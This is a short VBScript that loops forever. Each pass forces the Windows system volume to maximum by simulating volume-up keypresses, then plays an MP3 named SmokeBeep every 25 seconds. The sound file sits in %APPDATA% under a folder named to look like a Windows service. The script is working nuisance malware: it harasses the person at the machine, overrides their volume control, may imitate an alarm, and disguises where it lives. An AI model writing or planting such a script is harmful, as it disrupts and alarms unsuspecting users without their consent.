Option Explicit

Dim objShell, player, i, mp3Path
Set objShell = CreateObject("WScript.Shell")
Set player = CreateObject("WMPlayer.OCX")

mp3Path = objShell.ExpandEnvironmentStrings("%APPDATA%\WindowsServiceProvider4\SmokeBeep.MP3")

Do
    ' --- Step 1: Set system volume to max ---
    For i = 1 To 55
        objShell.SendKeys chr(175)
    Next

    ' --- Step 2: Play MP3 ---
    On Error Resume Next
    player.controls.stop
    On Error GoTo 0

    player.settings.volume = 100
    player.URL = mp3Path
    player.controls.play

    ' Wait 25 seconds
    WScript.Sleep 25000
Loop

